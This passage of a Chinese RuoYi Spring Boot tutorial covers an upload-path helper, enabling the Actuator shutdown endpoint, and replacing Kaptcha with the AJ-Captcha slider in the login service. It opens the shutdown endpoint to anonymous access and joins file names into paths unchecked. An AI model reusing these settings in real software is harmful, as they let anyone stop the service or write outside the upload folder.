<pre><code class="prism language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">File</span> <span class="token function">getAbsoluteFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> uploadDir<span class="token punctuation">,</span> <span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">File</span> desc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>uploadDir <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		desc<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// undertow文件上传，因底层实现不同,无需创建新文件</span>
	<span class="token comment">// if (!desc.exists())</span>
	<span class="token comment">// {<!-- --></span>
	<span class="token comment">//    desc.createNewFile();</span>
	<span class="token comment">// }</span>
	<span class="token keyword">return</span> desc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="5actuator_5150"></a>5、集成actuator实现优雅关闭应用</h2>
<p>优雅停机主要应用在版本更新的时候，为了等待正在工作的线程全部执行完毕，然后再停止。我们可以使用<code>SpringBoot</code>提供的<code>Actuator</code></p>
<p>1、<code>pom.xml</code>中引入<code>actuator</code>依赖</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-actuator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、配置文件中<code>endpoint</code>开启<code>shutdown</code></p>
<pre><code class="prism language-yml"><span class="token key atrule">management</span><span class="token punctuation">:</span>
  <span class="token key atrule">endpoint</span><span class="token punctuation">:</span>
    <span class="token key atrule">shutdown</span><span class="token punctuation">:</span>
      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">endpoints</span><span class="token punctuation">:</span>
    <span class="token key atrule">web</span><span class="token punctuation">:</span>
      <span class="token key atrule">exposure</span><span class="token punctuation">:</span>
        <span class="token key atrule">include</span><span class="token punctuation">:</span> <span class="token string">"shutdown"</span>
      <span class="token key atrule">base-path</span><span class="token punctuation">:</span> /monitor
</code></pre>
<p>3、在<code>SecurityConfig</code>中设置<code>httpSecurity</code>配置匿名访问</p>
<pre><code class="prism language-java"><span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/monitor/shutdown"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anonymous</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>4、<code>Post</code>请求测试验证优雅停机 curl -X POST http://localhost:8080/monitor/shutdown</p>
<h2><a id="6ajcaptcha_5185"></a>6、集成aj-captcha实现滑块验证码</h2>
<p>集成以<code>AJ-Captcha</code>滑块验证码为例，不需要键盘手动输入，极大优化了传统验证码用户体验不佳的问题。目前对外提供两种类型的验证码，其中包含滑动拼图、文字点选。</p>
<p>1、<code>ruoyi-framework\pom.xml</code>添加依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- 滑块验证码  --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.github.anji-plus<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>captcha-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 原有的验证码kaptcha依赖不需要可以删除  --&gt;</span>
</code></pre>
<p>2、修改<code>application.yml</code>，加入<code>aj-captcha</code>配置</p>
<pre><code class="prism language-yml"><span class="token comment"># 滑块验证码</span>
<span class="token key atrule">aj</span><span class="token punctuation">:</span>
   <span class="token key atrule">captcha</span><span class="token punctuation">:</span>
      <span class="token comment"># 缓存类型</span>
      <span class="token key atrule">cache-type</span><span class="token punctuation">:</span> redis
      <span class="token comment"># blockPuzzle 滑块 clickWord 文字点选  default默认两者都实例化</span>
      <span class="token key atrule">type</span><span class="token punctuation">:</span> blockPuzzle
      <span class="token comment"># 右下角显示字</span>
      <span class="token key atrule">water-mark</span><span class="token punctuation">:</span> ruoyi.vip
      <span class="token comment"># 校验滑动拼图允许误差偏移量(默认5像素)</span>
      <span class="token key atrule">slip-offset</span><span class="token punctuation">:</span> <span class="token number">5</span>
      <span class="token comment"># aes加密坐标开启或者禁用(true|false)</span>
      <span class="token key atrule">aes-status</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
      <span class="token comment"># 滑动干扰项(0/1/2)</span>
      <span class="token key atrule">interference-options</span><span class="token punctuation">:</span> <span class="token number">2</span>
</code></pre>
<p>同时在<code>ruoyi-admin\src\main\resources\META-INF\services</code>下创建com.anji.captcha.service.CaptchaCacheService文件同时设置文件内容为</p>
<pre><code class="prism language-java"><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span>CaptchaRedisService</span>
</code></pre>
<p>1</p>
<p>3、在SecurityConfig中设置httpSecurity配置匿名访问</p>
<pre><code class="prism language-java"><span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> <span class="token string">"/captcha/get"</span><span class="token punctuation">,</span> <span class="token string">"/captcha/check"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>1</p>
<p>4、修改相关类</p>
<p>可以移除不需要的类</p>
<pre><code>ruoyi-admin\com\ruoyi\web\controller\common\CaptchaController.java`
`ruoyi-framework\com\ruoyi\framework\config\CaptchaConfig.java`
`ruoyi-framework\com\ruoyi\framework\config\KaptchaTextCreator.java
</code></pre>
<p>修改<code>ruoyi-admin\com\ruoyi\web\controller\system\SysLoginController.java</code></p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 登录方法
 * 
 * @param loginBody 登录信息
 * @return 结果
 */</span>
<span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">LoginBody</span> loginBody<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">AjaxResult</span> ajax <span class="token operator">=</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 生成令牌</span>
	<span class="token class-name">String</span> token <span class="token operator">=</span> loginService<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span>loginBody<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> loginBody<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> loginBody<span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ajax<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Constants</span><span class="token punctuation">.</span>TOKEN<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> ajax<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>修改<code>ruoyi-framework\com\ruoyi\framework\web\service\SysLoginService.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Lazy</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>authentication<span class="token punctuation">.</span></span><span class="token class-name">AuthenticationManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>authentication<span class="token punctuation">.</span></span><span class="token class-name">BadCredentialsException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>authentication<span class="token punctuation">.</span></span><span class="token class-name">UsernamePasswordAuthenticationToken</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">Authentication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>anji<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span>model<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">ResponseModel</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>anji<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span>model<span class="token punctuation">.</span>vo<span class="token punctuation">.</span></span><span class="token class-name">CaptchaVO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>anji<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">CaptchaService</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>constant<span class="token punctuation">.</span></span><span class="token class-name">Constants</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">SysUser</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">LoginUser</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span></span><span class="token class-name">ServiceException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>user<span class="token punctuation">.</span></span><span class="token class-name">CaptchaException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>user<span class="token punctuation">.</span></span><span class="token class-name">UserPasswordNotMatchException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">DateUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">MessageUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">ServletUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>ip<span class="token punctuation">.</span></span><span class="token class-name">IpUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>manager<span class="token punctuation">.</span></span><span class="token class-name">AsyncManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>manager<span class="token punctuation">.</span>factory<span class="token punctuation">.</span></span><span class="token class-name">AsyncFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ISysUserService</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 登录校验方法
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysLoginService</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">TokenService</span> tokenService<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">AuthenticationManager</span> authenticationManager<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ISysUserService</span> userService<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token annotation punctuation">@Lazy</span>
    <span class="token keyword">private</span> <span class="token class-name">CaptchaService</span> captchaService<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 登录验证
     * 
     * @param username 用户名
     * @param password 密码
     * @param code 验证码
     * @return 结果
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">,</span> <span class="token class-name">String</span> code<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">CaptchaVO</span> captchaVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CaptchaVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        captchaVO<span class="token punctuation">.</span><span class="token function">setCaptchaVerification</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ResponseModel</span> response <span class="token operator">=</span> captchaService<span class="token punctuation">.</span><span class="token function">verification</span><span class="token punctuation">(</span>captchaVO<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span><span class="token function">isSuccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">AsyncManager</span><span class="token punctuation">.</span><span class="token function">me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">AsyncFactory</span><span class="token punctuation">.</span><span class="token function">recordLogininfor</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOGIN_FAIL<span class="token punctuation">,</span>
                    <span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.jcaptcha.error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">CaptchaException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 用户验证</span>
        <span class="token class-name">Authentication</span> authentication <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// 该方法会去调用UserDetailsServiceImpl.loadUserByUsername</span>
            authentication <span class="token operator">=</span> authenticationManager
                    <span class="token punctuation">.</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UsernamePasswordAuthenticationToken</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">BadCredentialsException</span><span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                <span class="token class-name">AsyncManager</span><span class="token punctuation">.</span><span class="token function">me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">AsyncFactory</span><span class="token punctuation">.</span><span class="token function">recordLogininfor</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOGIN_FAIL<span class="token punctuation">,</span> <span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.password.not.match"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UserPasswordNotMatchException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{<!-- --></span>
                <span class="token class-name">AsyncManager</span><span class="token punctuation">.</span><span class="token function">me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">AsyncFactory</span><span class="token punctuation">.</span><span class="token function">recordLogininfor</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOGIN_FAIL<span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">AsyncManager</span><span class="token punctuation">.</span><span class="token function">me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">AsyncFactory</span><span class="token punctuation">.</span><span class="token function">recordLogininfor</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>LOGIN_SUCCESS<span class="token punctuation">,</span> <span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.success"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LoginUser</span> loginUser <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LoginUser</span><span class="token punctuation">)</span> authentication<span class="token punctuation">.</span><span class="token function">getPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 生成token</span>
        <span class="token keyword">return</span> tokenService<span class="token punctuation">.</span><span class="token function">createToken</span><span class="token punctuation">(</span>loginUser<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 记录登录信息
     *
     * @param userId 用户ID
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">recordLoginInfo</span><span class="token punctuation">(</span><span class="token class-name">Long</span> userId<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">SysUser</span> sysUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SysUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sysUser<span class="token punctuation">.</span><span class="token function">setUserId</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        sysUser<span class="token punctuation">.</span><span class="token function">setLoginIp</span><span class="token punctuation">(</span><span class="token class-name">IpUtils</span><span class="token punctuation">.</span><span class="token function">getIpAddr</span><span class="token punctuation">(</span><span class="token class-name">ServletUtils</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sysUser<span class="token punctuation">.</span><span class="token function">setLoginDate</span><span class="token punctuation">(</span><span class="token class-name">DateUtils</span><span class="token punctuation">.</span><span class="token function">getNowDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        userService<span class="token punctuation">.</span><span class="token function">updateUserProfile</span><span class="token punctuation">(</span>sysUser<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>新增 <code>ruoyi-framework\com\ruoyi\framework\web\service\CaptchaRedisService.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StringRedisTemplate</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>anji<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">CaptchaCacheService</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 自定义redis验证码缓存实现类
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CaptchaRedisService</span> <span class="token keyword">implements</span> <span class="token class-name">CaptchaCacheService</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">StringRedisTemplate</span> stringRedisTemplate<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">String</span> value<span class="token punctuation">,</span> <span class="token keyword">long</span> expiresInSeconds<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        stringRedisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> expiresInSeconds<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> stringRedisTemplate<span class="token punctuation">.</span><span class="token function">hasKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        stringRedisTemplate<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> stringRedisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Long</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token keyword">long</span> val<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> stringRedisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
